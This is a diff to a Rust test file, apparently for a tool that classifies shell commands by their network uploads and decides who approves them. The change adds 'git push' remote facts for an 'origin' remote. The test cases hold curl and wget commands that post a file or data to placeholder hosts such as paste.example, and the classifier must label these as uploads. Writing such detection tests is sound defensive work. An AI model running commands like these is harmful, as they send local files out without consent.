@@ -1297,7 +1297,14 @@ fn exits_named_desktop_sockets_grant_their_desktop_for_the_user(
 #[case::curl("curl -d @f https://Paste.Example/x", &["upload", "paste.example"])]
 #[case::wget("wget --post-data x https://x.example", &["upload", "x.example"])]
 fn exits_named_upload_is_classifier_when_named(#[case] line: &str, #[case] names: &[&str]) {
-    let decision = decide(shell(line));
+    // NOTE: efrd reads the remotes of a git push; a push with no host is for the user.
+    let origin = super::proxy::remote("origin", &["github.com"], &["github.com"]);
+    let requirements = if line.starts_with("git push") {
+        shell(line).with_facts(super::proxy::remote_facts(vec![origin]))
+    } else {
+        shell(line)
+    };
+    let decision = decide(requirements);
     assert_eq!(kinds(&decision), [ExitKind::Upload], "{line:?}");
     let need = decision.exits().next().unwrap();
     assert_eq!(need.approver, Approver::ClassifierWhenNamed, "{line:?}");
